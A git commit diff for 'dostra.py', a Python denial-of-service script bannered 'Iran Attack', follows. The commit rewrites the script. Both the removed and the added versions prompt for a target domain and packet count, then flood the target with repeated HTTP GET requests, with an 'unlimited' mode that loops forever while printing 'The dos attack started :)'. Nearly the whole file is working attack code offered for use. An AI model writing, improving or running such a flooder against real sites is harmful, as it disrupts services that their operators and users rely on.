5f8a4238624052a705cffc8ac745e3dae4a72e27
emanuel victor <googltm2020@gmail.com>
2023-06-02 21:30:35 -0500

    Update dostra.py

--- dostra.py
+++ dostra.py
@@ -1,80 +1,82 @@
-import os
-
-os.system('pip install termcolor && pip install requests && clear')
-import termcolor
-from termcolor import colored
+from ast import Pass
+from time import sleep
+from requests import get as requests_get
+from time import localtime,strftime
 
 def main():
-                   
-    print(colored("██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░",'blue'))
-    print(colored("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗",'blue'))
-    print(colored("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║",'blue'))
-    print(colored("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║",'blue'))
-    print(colored("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║",'blue'))
-    print(colored("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝",'blue'))
-    print(colored("-------------------------------------------------", 'white',attrs=['blink']))
-    print(colored("| 𝕞𝕒𝕕𝕖 𝕓𝕪 𝕖𝕞𝕒𝕟𝕦𝕖𝕝 𝕧𝕚𝕔𝕥𝕠𝕣 |\n", 'green'))
 
-
+    print("\n██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░")
+    print("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗")
+    print("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║")
+    print("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║")
+    print("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║")
+    print("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝")
+    print("-------------------------------------------------")
+    print("   ----| Iran Attack _ GitHub:@emnatkins |----   ")
+    print("-------------------------------------------------\n\n")
 main()
 
-
-
-
-
-import requests
 def dos():
-        s = input(colored("enter your target\n example: google.com\n\n ~> ",'magenta'))
-        #------------------------------
-        import socket
-        def is_connected():
-          try:
-            # see if we can resolve the host name -- tells us if there is
-            # a DNS listening
-            host = socket.gethostbyname(s)
-            # connect to the host -- tells us if the host is actually
-            # reachable
-            s = socket.create_connection((host, 80), 2)
-            return True
-          except:
-             pass
-          return False
-        #------------------------------
-        if is_connected : 
-    
-            c = input(colored("Do you want continue? y/n? ~> ",'yellow'))
-    
-            if c == 'y':
-                packet = input(colored("enter your Packet Size\n-------------------\nexample: 100000\n-------------------\nor :Enter \"u\" if you want the Packet to be unlimited \n ~> ",'cyan'))
-                count = 0
+        print("=======================================\n|")
+        s = input("-- target: ")
+
+        c = input("-- Do you want continue (y/n): ")
+        if c == 'y':
+            packet = input("-- Packet Size (\"u\" = unlimited): ")
+            print("|\n=======================================\n\n")
+            count = 0
+            
+            if s[0:7] == "http://":
+                s = s[7:len(s)]
+            elif s[0:8] == "https://":
+                s = s[8:len(s)]
+
+            is_connected = False
+            try:
+                requests_get("http://"+s)
+                is_connected = True
+            except:
+                pass
+            if is_connected:
                 if packet == "u":
-                    print(colored("The dos attack started :)",'green'))
+                    print("===== The dos attack started :)")
                     while True:
-                        r = requests.get("http://"+s)
-                        print(colored(f"Pocket was sent ({count})", 'red'))
-                        count+=1
-                        r = requests.get("http://"+s)
-                        print(colored(f"Pocket was sent ({count})", 'blue'))
+                        named_tuple = localtime() # get struct_time
+                        time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
+                        r = requests_get("http://"+s)
+                        print(f"[{time_string}] Pocket was sent ({count})")
                         count+=1
                 elif int(packet)>=1:
-                    print(colored("The dos attack started :)",'green'))
+                    print("===== The dos attack started :)")
                     while count <= int(packet):
-                        r = requests.get("http://"+s)
-                        print(colored(f"Pocket was sent ({count})", 'red'))
+                        named_tuple = localtime() # get struct_time
+                        time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
+                        r = requests_get("http://"+s)
+                        print(f"[{time_string}] Pocket was sent ({count})")
                         count+=1
-                        r = requests.get("http://"+s)
-                        print(colored(f"Pocket was sent ({count})", 'blue'))
-                        count+=1
+                    else:
+                        print("it is finished!")
+                        exit_input = input("Do you want to stay in the tool? (y/n): ")
+                        
+                        if exit_input == "n":
+                            sleep(9999999999999)
+                        
+                        print("Note: The program closes automatically after 5 seconds!")
+                        sleep(5)
                 else:
-                    print(colored("Please enter the correct number of packets :(",'red'))            
-            elif c == 'n':
-                os.system('clear')
-                main()
-                dos()
+                    print("Error : Please enter the correct number of packets :(")
+                    print("Note: The program closes automatically after 5 seconds!")
+                    sleep(5)
             else:
-                print(colored("Please use the correct character :(",'red'))          
+                print("Error : Please enter a valid site address :/")
+                print("Note: The program closes automatically after 5 seconds!")
+                sleep(5)
+        elif c == 'n':
+            print("bye! :)\nNote: The program closes automatically after 5 seconds!")
+            sleep(5)
+
         else:
-            print("Please enter a valid site address")
-
-
+            print("Error : Please use the correct character :(")
+            print("Note: The program closes automatically after 5 seconds!")
+            sleep(5)
 dos()
